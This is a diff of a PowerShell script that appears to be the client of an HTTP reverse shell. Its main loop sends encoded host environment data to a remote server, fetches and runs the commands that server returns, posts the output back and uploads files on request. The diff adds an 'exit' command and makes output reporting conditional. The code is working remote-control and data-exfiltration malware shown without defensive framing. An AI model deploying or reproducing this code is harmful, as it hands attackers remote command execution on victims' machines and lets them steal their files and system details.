@@ -69,8 +69,8 @@ function Send-HttpRequest {
 # Main
 while ($true) {
    if ($server -notlike "http*") { $server = "http://" + $server }
-   $invoke64 = "Write-Output HTTPShellNull" ; if ($sleeps) { Start-Sleep $sleeps }
-   $env = GetEnviron ; $commandx = $null ; $errorlog = $null ; $getenv64 = $(R64Encoder -t $env) 2> $null
+   $env = GetEnviron ; $invoke64 = $null ; if ($sleeps) { Start-Sleep $sleeps }
+   $commandx = $null ; $errorlog = $null ; $getenv64 = $(R64Encoder -t $env) 2> $null
    $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2> $null
    $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2> $null
    $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2> $null
@@ -88,10 +88,11 @@ while ($true) {
       $file_content = $(R64Encoder -f "$file_path") 2> $null
       $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2> $null }
 
+   if ($invoke64 -eq "exit") { exit }
+
    if ($pwshversion -gt 4) { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64 $redirectors") | Out-String) 2>&1 }}
    else { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 }} ; $param = "Debug"
    if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
    if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
-   $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
-   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }
-   
+   if ($commandx) { $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
+   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }}
